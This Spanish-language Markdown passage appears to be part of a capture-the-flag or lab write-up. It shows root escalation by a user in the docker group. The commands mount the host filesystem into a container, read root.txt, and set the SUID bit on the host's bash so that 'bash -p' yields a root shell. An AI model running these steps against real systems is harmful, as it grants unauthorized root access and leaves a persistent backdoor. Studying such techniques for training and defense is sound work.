## Escalacion de privilegios {-}

### Enumeracion del usuario en la maquina victima {-}

```bash
whoami
id
```

Ya es sufficiente aqui porque ya se puede ver quel usuario esta en el grupo Docker.

### Escalacion de privilegios con Docker {-}

1. Checkear las imagenes Docker existentes

    ```bash
    docker ps
    ```

1. Utilizar una imagen existente para crear un contenedor y **mountarle** la raiz del systema en el contenedor

    ```bash
    docker run --rm -it -v /:/mnt rodhes bash
    cd /mnt/root/
    cat root.txt
    ```

1. Escalar privilegios en la maquina real

    - en el contenedor

        ```bash
        cd /mnt/bin
        chmod 4755 bash
        exit
        ```
    
    - en la maquina real

        ```bash
        bash -p
        whoami

        #Output
        root
        ```

